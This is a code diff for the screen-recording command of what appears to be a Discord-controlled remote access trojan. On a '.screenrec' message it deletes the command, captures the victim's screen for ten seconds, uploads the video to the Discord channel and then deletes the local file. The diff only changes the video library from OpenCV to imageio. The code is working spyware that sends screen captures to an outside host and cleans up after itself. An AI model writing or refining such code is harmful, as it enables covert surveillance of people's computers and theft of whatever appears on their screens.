@@ -1,33 +1,36 @@
 import pyautogui
-import cv2
 import numpy as np
 import subprocess
 import time
-# end of imports
+import imageio
 
 # on message
 elif message.content == '.screenrec':
     await message.delete()
     await message.channel.send("`Recording... Please wait.`")
-    fourcc = cv2.VideoWriter_fourcc(*"H264") # finally proper H264 support!
-    fps = 30.0
-    output_filename = "recording.mp4"
-    output_size = (0, 0)
-    output = None
 
-    screen_size = (pyautogui.size().width, pyautogui.size().height)
+    output_file = 'recording.mp4'
+    screen_width, screen_height = pyautogui.size()
+    screen_region = (0, 0, screen_width, screen_height)
+    frames = []
+
+    duration = 10
+    fps = 30
+    num_frames = duration * fps
+
     start_time = time.time()
 
-    while time.time() - start_time < 10:
-        if output is None:
-            output = cv2.VideoWriter(output_filename, fourcc, fps, screen_size)
+    try:
+        for _ in range(num_frames):
+            img = pyautogui.screenshot(region=screen_region)
+            frame = np.array(img)
+            frames.append(frame)
 
-        img = pyautogui.screenshot()
-        frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
-        output.write(frame)
+        imageio.mimsave(output_file, frames, fps=fps, quality=8)
 
-    if output is not None:
-        output.release()
+        reaction_msg = await message.channel.send("Screen Recording `[On demand]`", file=discord.File(output_file))
+        await reaction_msg.add_reaction('📌')
+        subprocess.run('del recording.mp4', shell=True)
 
-    reaction_msg = await message.channel.send("Screen Recording `[On demand]`", file=discord.File('recording.mp4')); await reaction_msg.add_reaction('📌')
-    subprocess.run('del recording.mp4', shell=True)
+    except Exception as e:
+        await message.channel.send("An error occurred during screen recording.")
